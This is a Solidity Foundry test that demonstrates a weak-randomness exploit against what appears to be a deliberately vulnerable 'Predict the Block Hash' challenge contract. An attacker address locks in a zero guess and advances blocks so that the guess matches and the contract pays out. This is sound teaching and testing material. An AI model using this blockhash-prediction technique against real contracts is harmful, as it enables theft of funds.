
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PredictTheBlockHashChallenge} from "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {
    PredictTheBlockHashChallenge challenge;
    address attacker = address(0xBEEF);

    function setUp() public {
        vm.deal(attacker, 10 ether);
        vm.prank(attacker);
        challenge = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 startBlockNumber) public {
        vm.assume(startBlockNumber > 0);
        vm.assume(startBlockNumber < type(uint256).max - 1000);

        vm.roll(startBlockNumber);

        vm.startPrank(attacker);
        challenge.lockInGuess{value: 1 ether}(bytes32(0));

        uint256 targetBlock = startBlockNumber + 1;
        vm.roll(targetBlock);

        bytes32 predictedAnswer = blockhash(targetBlock);

        vm.roll(targetBlock + 1);
        challenge.settle();
        vm.stopPrank();

        assertEq(
            predictedAnswer,
            bytes32(0),
            "Locally predicted blockhash should match the guess used to drain the contract"
        );
    }

    receive() external payable {}

    fallback() external payable {}
}
